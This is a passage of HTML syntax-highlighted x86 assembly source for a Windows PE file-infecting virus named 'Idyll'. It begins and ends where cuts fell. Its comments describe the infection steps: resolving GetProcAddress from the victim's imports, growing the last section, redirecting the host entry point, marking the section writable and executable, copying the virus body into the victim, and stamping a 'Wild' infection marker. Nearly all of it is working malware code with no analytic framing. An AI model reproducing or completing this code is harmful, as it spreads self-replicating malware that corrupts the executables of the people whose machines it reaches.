    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_gmh</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">;store add of GetModuleHandleA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_gpastring</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;GetProcAddress string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect_findimports</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                         </span><span class="sc1">;size of string</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect_find_fn</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_fail</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_peheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_gpa</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_peheader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;needless</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;get object count</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">;counting starts from 1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_1stsec</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get ptr to 1st entry</span><span class="sc0">
</span><span class="sc5">idyll_infect_getlastentry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">              </span><span class="sc1">;size of each entry </span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">idyll_infect_getlastentry</span><span class="sc0">      </span><span class="sc1">;get ptr to last entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get section RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">;esi points to PhysOffset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;RVA+PhysOffset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;PhysOffset of last section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_peheader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;needless again</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get file alignment unit</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;zero reg</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;increase section PhysSize by file alignment units</span><span class="sc0">
</span><span class="sc1">;until its larger than virus size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_infect_fixsize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;add filealign</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">idyll_size</span><span class="sc0">          </span><span class="sc1">;virus size</span><span class="sc0">
    </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">idyll_infect_fixsize</span><span class="sc0">             </span><span class="sc1">;loop if section smaller than virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_sectsize</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">;set new PhysSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;set new VirtSize</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get entry RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_hostentry</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;save restart address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">;modify host entry RVA in PE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0e0000020h</span><span class="sc0">          </span><span class="sc1">;object flags:[CERW]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">           </span><span class="sc1">;set flags</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_unmap_close</span><span class="sc0">          </span><span class="sc1">;unmap and close file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_mapfile</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_fail</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">     
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_testfile</span><span class="sc0">         </span><span class="sc1">;?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_finddata_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;why?</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_mappedadd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">idyll_size</span><span class="sc0">          </span><span class="sc1">;virus size</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;move virus into victim</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;ptr to PE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc12">'Wild'</span><span class="sc0">            </span><span class="sc1">;mark file infected</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_unmap_close</span><span class="sc0">          </span><span class="sc1">;unmap and close file</span><span class="sc0">
</span><span class="sc5">idyll_infect_return_success</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;fucking waste of space to</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return nonzero value</span><span class="sc0">
</span><span class="sc5">idyll_infect_fail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_unmap_close</span><span class="sc0">
</span><span class="sc5">idyll_infect_return_failure</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;subroutine to</span><span class="sc0">
</span><span class="sc1">;determine whether a file can be infected</span><span class="sc0">
</span><span class="sc1">;in:    eax:va of mapped file</span><span class="sc0">
</span><span class="sc1">;out:   eax:zero if file can be infected</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_testfile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;va of mapped file into ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">;exe?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">idyll_testfile_return_failure</span><span class="sc1">;nope abort</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get ptr to PE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_peheader</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;load ptr into edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">     </span><span class="sc1">;a PE?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">idyll_testfile_return_failure</span><span class="sc1">;nope abort</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc12">'Wild'</span><span class="sc0">        </span><span class="sc1">;already infected?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_testfile_return_failure</span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;number of interesting rva's</span><span class="sc0">
</span><span class="sc5">idyll_testfile_rva_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;skip item</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">idyll_testfile_rva_loop</span><span class="sc0">    </span><span class="sc1">;so we'll get a ptr to sectiontable</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_1stsec</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc1">;store ptr to 1st entry in</span><span class="sc0">
                     </span><span class="sc1">;sectiontable              </span><span class="sc0">
</span><span class="sc5">idyll_testfile_return_success</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;and return succes to caller</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">idyll_testfile_return_failure</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;return failure to caller</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;find a function in the victims imports</span><span class="sc0">
</span><span class="sc1">;(called when infecting to get GetModuleHandleA and GetProcAddress)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_infect_find_fn</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;@12B0(84B0)</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">idyll_infect_find_fn_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;endmarker?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_find_fn_return_failure</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect_findimports</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">           </span><span class="sc1">;compare names</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;found?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_find_fn_done</span><span class="sc0">   </span><span class="sc1">;yes</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;nope,loop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">idyll_infect_find_fn_loop</span><span class="sc0">
</span><span class="sc5">idyll_infect_find_fn_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">idyll_infect_find_fn_return_failure</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;return failure</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;find KERNEL32 string in import module names list</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_infect_findk32</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;@12E2(84E2)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;size of string</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_dllnamebuffer</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;destination</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;uppercase input.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_infect_findk32_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get char</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">              </span><span class="sc1">;lowercase?</span><span class="sc0">
    </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">idyll_infect_findk32_uppercase</span><span class="sc0">  </span><span class="sc1">;nope,store char</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">       </span><span class="sc1">;convert to upper</span><span class="sc0">
</span><span class="sc5">idyll_infect_findk32_uppercase</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">            </span><span class="sc1">;and store char</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;increase dest ptr</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;increase src ptr</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">idyll_infect_findk32_loop</span><span class="sc0">      </span><span class="sc1">;branch</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;get ptr back</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;get str len back</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_k32string</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ptr to 'KERNEL32' string</span><span class="sc0">
    </span><span class="sc6">repz</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">           </span><span class="sc1">;compare strings</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;eax hold return value,zero if K32 found</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;get regs back</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">;return to caller</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;find the section that contains imports</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_infect_findimports</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;@1314(8514)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
